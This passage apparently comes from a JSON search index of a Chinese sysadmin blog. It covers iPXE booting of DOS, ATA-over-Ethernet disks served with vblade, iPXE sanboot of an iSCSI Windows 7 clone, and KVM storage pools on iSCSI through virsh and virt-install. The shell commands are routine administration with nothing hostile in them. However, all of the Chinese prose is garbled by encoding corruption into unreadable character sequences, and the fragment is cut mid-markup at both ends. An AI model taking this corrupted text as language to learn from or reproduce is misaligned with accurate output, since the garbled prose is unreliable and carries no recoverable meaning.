class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ememdiskæ˜¯ä»syslinuxä¸­æ‹·è´çš„ï¼Œä¹Ÿæ˜¯ç¥å™¨ã€‚\u003c/p\u003e\n\u003cp\u003eå…¶å®å¯ä»¥ç”¨sanbootæ¥å¯åŠ¨çš„ï¼Œä½†æ˜¯é‚£æ ·èµ·åŠ¨èµ·æ¥çš„ç³»ç»Ÿå¯¹Cç›˜æ— å†™æƒé™ï¼Œå› ä¸ºdosä¸‹æ²¡æœ‰sançš„é©±åŠ¨å¯ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥æ”¹ç”¨memdiskï¼Œè¿™æ ·æƒé™å˜ä¸ºå¯å†™çš„äº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240118171412093\" loading=\"lazy\" src=\"/posts/20240118-ipxe_dos/image-20240118171412093.png\"\u003e\u003c/p\u003e","title":"ipxeå¯åŠ¨Dos 6.22"},{"content":"å…ˆæ™®åŠä¸€ä¸‹ï¼Œaoeï¼ˆata over ethernetï¼‰ï¼Œè·Ÿiscsiå·®ä¸å¤šï¼Œä¸è¿‡æ˜¯ç¡¬ç›˜åè®®èµ°åœ¨äº†ä»¥å¤ªç½‘ä¸Šã€‚iscsiæ˜¯3å±‚çš„åè®®ï¼Œaoeæ˜¯äºŒå±‚çš„åè®®ã€‚\nå› ä¸ºæ˜¯äºŒå±‚çš„ï¼Œæ‰€ä»¥æ²¡æœ‰ç½‘å…³ã€è·¯ç”±ç­‰ç­‰ï¼Œç›¸å¯¹å¼ºåˆ¶çš„ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯å¿…é¡»æ˜¯ä½äºåŒä¸€å­ç½‘å†…ã€‚\nå…ˆè£…æœåŠ¡ç«¯vbladeï¼š\nyum install vblade ç„¶åå‡†å¤‡å­˜å‚¨ç©ºé—´ï¼Œåƒlvã€rawæ–‡ä»¶ã€ç¡¬ç›˜(/dev/sdb)ã€ç¡¬ç›˜åˆ†åŒº(/dev/sdb1)æˆ–è€…raidç£ç›˜/dev/md0éƒ½å¯ä»¥ç”¨ä½œå‚¨å­˜ã€‚\nåšä¸€å—20Gçš„rawæ–‡ä»¶å­˜å‚¨ç©ºé—´ï¼š\nmkdir /storage dd if=/dev/zero of=/storage/storage1.img bs=1024k count=20000 åšä¸€å—aoeç¡¬ç›˜ï¼š\nvbladed 65535 255 eth0 /storage/storage1.img è§£é‡Šä¸€ä¸‹ vbladed åé¢è·Ÿäº†2ä¸ªæ•°å­—ï¼Œç¬¬ä¸€ä¸ªæ˜¯ä¸»åºåˆ—å·ï¼Œå¯ä»¥ä» 0-65535ï¼Œç¬¬äºŒä¸ªæ˜¯æ¬¡åºåˆ—å·ï¼Œå¯ä»¥ä»0-255ã€‚ç„¶åè·Ÿå‘å¸ƒçš„ç½‘å¡ï¼Œæœ€åæ˜¯å­˜å‚¨ç©ºé—´ã€‚\næœ€å¥½æŠŠvbladedæ”¾å…¥/etc/rc.d/rc.local\nvi /etc/rc.local vbladed 65535 255 eth0 /storage/storage1.img okï¼ŒæœåŠ¡å™¨ç«¯çš„å·¥ä½œå°±å®Œæˆäº†ï¼Œå¤§å®¶çœ‹åˆ°äº†ï¼ŒåŸºæœ¬ä»€ä¹ˆä¹Ÿæ²¡è®¾ï¼Œå› ä¸ºæ˜¯èµ°åœ¨äºŒå±‚ä¹ˆã€‚\nç„¶åipxeéƒ¨åˆ†å°±ç®€å•äº†ï¼Œä¾æ ·ç”»è‘«èŠ¦ä¿®æ”¹boot2.phpï¼š\ncase \u0026#39;\\52:54:00:d9:fe:43\u0026#39;: echo \u0026#34;set keep-san 1\\n\u0026#34;; echo \u0026#34;sanboot aoe:e65535.255\\n\u0026#34;; break; æå®š\n","permalink":"https://rendoumi.com/posts/20240118-ipxe_aoe/","summary":"\u003cp\u003eå…ˆæ™®åŠä¸€ä¸‹ï¼Œaoeï¼ˆata over ethernetï¼‰ï¼Œè·Ÿiscsiå·®ä¸å¤šï¼Œä¸è¿‡æ˜¯ç¡¬ç›˜åè®®èµ°åœ¨äº†ä»¥å¤ªç½‘ä¸Šã€‚iscsiæ˜¯3å±‚çš„åè®®ï¼Œaoeæ˜¯äºŒå±‚çš„åè®®ã€‚\u003c/p\u003e\n\u003cp\u003eå› ä¸ºæ˜¯äºŒå±‚çš„ï¼Œæ‰€ä»¥æ²¡æœ‰ç½‘å…³ã€è·¯ç”±ç­‰ç­‰ï¼Œç›¸å¯¹å¼ºåˆ¶çš„ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯å¿…é¡»æ˜¯ä½äºåŒä¸€å­ç½‘å†…ã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆè£…æœåŠ¡ç«¯vbladeï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install vblade  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åå‡†å¤‡å­˜å‚¨ç©ºé—´ï¼Œåƒlvã€rawæ–‡ä»¶ã€ç¡¬ç›˜(/dev/sdb)ã€ç¡¬ç›˜åˆ†åŒº(/dev/sdb1)æˆ–è€…raidç£ç›˜/dev/md0éƒ½å¯ä»¥ç”¨ä½œå‚¨å­˜ã€‚\u003c/p\u003e\n\u003cp\u003eåšä¸€å—20Gçš„rawæ–‡ä»¶å­˜å‚¨ç©ºé—´ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /storage  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/zero \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/storage/storage1.img \u003cspan class=\"nv\"\u003ebs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1024k \u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e20000\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåšä¸€å—aoeç¡¬ç›˜ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evbladed \u003cspan class=\"m\"\u003e65535\u003c/span\u003e \u003cspan class=\"m\"\u003e255\u003c/span\u003e eth0 /storage/storage1.img  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£é‡Šä¸€ä¸‹ vbladed åé¢è·Ÿäº†2ä¸ªæ•°å­—ï¼Œç¬¬ä¸€ä¸ªæ˜¯ä¸»åºåˆ—å·ï¼Œå¯ä»¥ä» 0-65535ï¼Œç¬¬äºŒä¸ªæ˜¯æ¬¡åºåˆ—å·ï¼Œå¯ä»¥ä»0-255ã€‚ç„¶åè·Ÿå‘å¸ƒçš„ç½‘å¡ï¼Œæœ€åæ˜¯å­˜å‚¨ç©ºé—´ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€å¥½æŠŠvbladedæ”¾å…¥/etc/rc.d/rc.local\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/rc.local  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evbladed \u003cspan class=\"m\"\u003e65535\u003c/span\u003e \u003cspan class=\"m\"\u003e255\u003c/span\u003e eth0 /storage/storage1.img  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eokï¼ŒæœåŠ¡å™¨ç«¯çš„å·¥ä½œå°±å®Œæˆäº†ï¼Œå¤§å®¶çœ‹åˆ°äº†ï¼ŒåŸºæœ¬ä»€ä¹ˆä¹Ÿæ²¡è®¾ï¼Œå› ä¸ºæ˜¯èµ°åœ¨äºŒå±‚ä¹ˆã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åipxeéƒ¨åˆ†å°±ç®€å•äº†ï¼Œä¾æ ·ç”»è‘«èŠ¦ä¿®æ”¹boot2.phpï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\52:54:00:d9:fe:43\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set keep-san 1\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;sanboot aoe:e65535.255\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæå®š\u003c/p\u003e","title":"ipxeä¸aoeå¯åŠ¨"},{"content":"æŒ‰ä¸Šä¸€ç¯‡æ‰€è¯´ï¼Œæˆ‘ä»¬å·²ç»å¼„äº†ä¸ªiscsiä¸Šé¢çš„win7å·ï¼Œå…¶å®å°±æ˜¯æŠŠèåœèŠ±å›­çš„win7 cloneåˆ°äº†ä¸€ä¸ª10Gçš„æ–‡ä»¶å·ä¸Šã€‚\nå¼•ç”³é—®é¢˜ï¼š å¤§å®¶å…¶å®å¯ä»¥ç”¨qcow2çš„æ–‡ä»¶æ ¼å¼ä¿å­˜çš„ï¼š\nqemu-img create -f qcow2 /export/iscsi/windows7.qcow2 60G vi /etc/tgt/targets.conf \u0026lt;target iqn.2016-07.com.renhe:renhe-16-8-6.disk03\u0026gt; backing-store /export/iscsi/disk03.img backing-store /export/iscsi/windows7.qcow2 write-cache off \u0026lt;/target\u0026gt; tgt-admin --execute é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•è®©ipxeç›´æ¥èµ·åŠ¨è¿™ä¸ªiscsiå·å‘¢ï¼Ÿ è¿˜æ˜¯ç¼–è¾‘boot2.phpå³å¯ï¼š\ncase \u0026#39;\\52:54:00:d9:fe:43\u0026#39;: echo \u0026#34;sanboot iscsi:172.16.8.6::3260:1:iqn.2016-07.iscsi:disk03\\n\u0026#34;; break; æ³¨æ„å•Šï¼ŒæŸ¥éå¾ˆå¤šç½‘ä¸Šèµ„æ–™ï¼š sanbootçš„å‚æ•°éƒ½æ˜¯iscsi:ip::::iqnï¼Œå®é™…æ— è®ºæ˜¯å®ä½“æœºçš„pxeï¼Œè¿˜æ˜¯kvmè™šæ‹Ÿæœºçš„pxeï¼Œéƒ½æ— æ³•å¯åŠ¨ã€‚ä»¥ä¸‹æ ¼å¼æ‰æ˜¯æ­£ç¡®çš„ï¼š iscsi:ip::3260:1:iqn\nè¿™æ ·è£…ä¸ªwin7å°±ç®€å•äº†ï¼Œæ‹·è´ä¸€ä¸‹disk03.imgè¿™ä¸ªæ¨¡æ¿ï¼Œå¯åŠ¨pxeå³å¯\n#!/bin/bash virt-install \\ --name=pxe-16-11-8 \\ --vcpu=2 \\ --ram=4096 \\ --nodisks \\ --boot network \\ --os-type=windows \\ --os-variant=win7 \\ --network bridge=br0 \\ --vnc --vnclisten=0.0.0.0 --vncport=5910 ä»¥åå°±å¯ä»¥ç”¨è¿™ä¸ªåŠæ³•ç¬é—´å¼„å‡ºä¸€å †winè™šæœºäº†ï¼Œç”¨å®Œå°±åˆ é™¤\n","permalink":"https://rendoumi.com/posts/20240118-ipxe_iscsi/","summary":"\u003cp\u003eæŒ‰ä¸Šä¸€ç¯‡æ‰€è¯´ï¼Œæˆ‘ä»¬å·²ç»å¼„äº†ä¸ªiscsiä¸Šé¢çš„win7å·ï¼Œå…¶å®å°±æ˜¯æŠŠèåœèŠ±å›­çš„win7 cloneåˆ°äº†ä¸€ä¸ª10Gçš„æ–‡ä»¶å·ä¸Šã€‚\u003c/p\u003e\n\u003cp\u003eå¼•ç”³é—®é¢˜ï¼š å¤§å®¶å…¶å®å¯ä»¥ç”¨qcow2çš„æ–‡ä»¶æ ¼å¼ä¿å­˜çš„ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eqemu-img create -f qcow2 /export/iscsi/windows7.qcow2 60G  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/tgt/targets.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;target iqn.2016-07.com.renhe:renhe-16-8-6.disk03\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    backing-store /export/iscsi/disk03.img\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    backing-store /export/iscsi/windows7.qcow2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    write-cache off\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/target\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etgt-admin --execute  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•è®©ipxeç›´æ¥èµ·åŠ¨è¿™ä¸ªiscsiå·å‘¢ï¼Ÿ è¿˜æ˜¯ç¼–è¾‘boot2.phpå³å¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\52:54:00:d9:fe:43\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;sanboot iscsi:172.16.8.6::3260:1:iqn.2016-07.iscsi:disk03\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„å•Šï¼ŒæŸ¥éå¾ˆå¤šç½‘ä¸Šèµ„æ–™ï¼š sanbootçš„å‚æ•°éƒ½æ˜¯iscsi:ip::::iqnï¼Œå®é™…æ— è®ºæ˜¯å®ä½“æœºçš„pxeï¼Œè¿˜æ˜¯kvmè™šæ‹Ÿæœºçš„pxeï¼Œéƒ½æ— æ³•å¯åŠ¨ã€‚ä»¥ä¸‹æ ¼å¼æ‰æ˜¯æ­£ç¡®çš„ï¼š\n\u003cstrong\u003eiscsi:ip::3260:1:iqn\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè¿™æ ·è£…ä¸ªwin7å°±ç®€å•äº†ï¼Œæ‹·è´ä¸€ä¸‹disk03.imgè¿™ä¸ªæ¨¡æ¿ï¼Œå¯åŠ¨pxeå³å¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003evirt-install \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--name\u003cspan class=\"o\"\u003e=\u003c/span\u003epxe-16-11-8 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vcpu\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--ram\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4096\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--nodisks \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--boot network \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-type\u003cspan class=\"o\"\u003e=\u003c/span\u003ewindows  \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-variant\u003cspan class=\"o\"\u003e=\u003c/span\u003ewin7 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vnc --vnclisten\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0 --vncport\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5910\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä»¥åå°±å¯ä»¥ç”¨è¿™ä¸ªåŠæ³•ç¬é—´å¼„å‡ºä¸€å †winè™šæœºäº†ï¼Œç”¨å®Œå°±åˆ é™¤\u003c/p\u003e","title":"ipxeè¿œç¨‹å¯åŠ¨iscsiä¸Šé¢çš„å…‹éš†å·"},{"content":"æœ€è¿‘éƒ½åœ¨ç ”ç©¶ipxeå’Œiscsiï¼Œé‚£ä¹ˆå¦‚ä½•è®©kvmä½¿ç”¨å­˜å‚¨åœ¨iscsiä¸Šé¢çš„æ–‡ä»¶å·å‘¢ï¼Ÿ\nå‡è®¾æˆ‘ä»¬å·²ç»æŒ‰ä¹‹å‰çš„æ–‡ç« æ¶å¥½äº†iscsiï¼š\né€ ä¸ª10Gæ–‡ä»¶:\ndd if=/dev/zero of=/export/iscsi/disk03.img count=0 bs=1 seek=10G æœåŠ¡ç«¯å¢åŠ iscsi target\nvi /etc/tgt/targets.conf \u0026lt;target iqn.2016-07.com.renhe:renhe-16-8-6.disk03\u0026gt; backing-store /export/iscsi/disk03.img write-cache off \u0026lt;/target\u0026gt; tgt-admin --execute isciå‡†å¤‡å¥½äº†ï¼Œç„¶åæˆ‘ä»¬å»kvmå®šä¹‰æ± å­ï¼šmyiscsi\nvirsh virsh# pool-define-as myiscsi 172.16.8.6 - iqn.2016-07.com.renhe:renhe-16-8-6.disk03 - /dev/disk/by-path virsh# pool-start myiscsi Name State Autostart ----------------------------------------- myiscsi active no virsh# pool-autostart myiscsi virsh # pool-list Name State Autostart ----------------------------------------- myiscsi active yes virsh# vol-list myiscsi Name Path ----------------------------------------- unit:0:0:1 /dev/disk/by-path/ip-172.16.8.6:3260-iscsi-iqn.2016-07.com.renhe:renhe-16-8-6.disk03-lun-1 okï¼Œè®°ä¸‹æ¥è¿™ä¸ªNameï¼šunit:0:0:1\nç„¶åæˆ‘ä»¬æ¥å®‰è£…winçš„kvmå§ï¼Œç›´æ¥cloneè¾“å‡ºåˆ°ç¡¬ç›˜\nvirt-install \\ --name=iscsi-16-11-9 \\ --vcpu=2 \\ --ram=4096 \\ --cdrom=/export/kvm/iso/Luobo_Ghost_Win7_SP1_x86_2015_0904.iso \\ --boot network,cdrom,hd,menu=on \\ --disk vol=myiscsi/unit:0:0:1 \\ --os-type=windows \\ --os-variant=win7 \\ --network bridge=br0 \\ --vnc --vnclisten=0.0.0.0 --vncport=5911 æ³¨æ„ä¸Šé¢diskçš„å‚æ•°ï¼Œmyiscsi/unit:0:0:1\nå¯åŠ¨åå°±ç›´æ¥å¼€å§‹å®‰è£…äº†ï¼Œé€‰è¿è¡ŒGhost11:\nç„¶åæŠŠwin7.ghoç»™cloneåˆ°10Gçš„ç›˜ä¸Šï¼š\né‡å¯åè¯·åœæ‰è™šæœºï¼Œç„¶åæŠŠè¿™ä¸ªcloneå¥½çš„åˆ†åŒºæ–‡ä»¶disk03.imgä¿å­˜ä¸€ä»½ï¼Œä¸‹æ¬¡å°±å¯ä»¥ç›´æ¥å¤åˆ¶åˆ°æ± å­é‡Œä¾›æ–°å»ºçš„è™šæœºç”¨äº†ï¼Œå“ˆå“ˆã€‚\n","permalink":"https://rendoumi.com/posts/20240118-kvm_iscsi/","summary":"\u003cp\u003eæœ€è¿‘éƒ½åœ¨ç ”ç©¶ipxeå’Œiscsiï¼Œé‚£ä¹ˆå¦‚ä½•è®©kvmä½¿ç”¨å­˜å‚¨åœ¨iscsiä¸Šé¢çš„æ–‡ä»¶å·å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eå‡è®¾æˆ‘ä»¬å·²ç»æŒ‰ä¹‹å‰çš„æ–‡ç« æ¶å¥½äº†iscsiï¼š\u003c/p\u003e\n\u003cp\u003eé€ ä¸ª10Gæ–‡ä»¶:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/zero \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/iscsi/disk03.img \u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"nv\"\u003ebs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eseek\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10G  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœåŠ¡ç«¯å¢åŠ iscsi target\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/tgt/targets.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;target iqn.2016-07.com.renhe:renhe-16-8-6.disk03\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    backing-store /export/iscsi/disk03.img\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    write-cache off\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/target\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etgt-admin --execute  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eisciå‡†å¤‡å¥½äº†ï¼Œç„¶åæˆ‘ä»¬å»kvmå®šä¹‰æ± å­ï¼š\u003cstrong\u003emyiscsi\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh# pool-define-as myiscsi 172.16.8.6 - iqn.2016-07.com.renhe:renhe-16-8-6.disk03 - /dev/disk/by-path\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh# pool-start myiscsi  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eName                 State      Autostart  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-----------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emyiscsi              active     no     \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh# pool-autostart myiscsi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh \u003cspan class=\"c1\"\u003e# pool-list  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eName                 State      Autostart  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 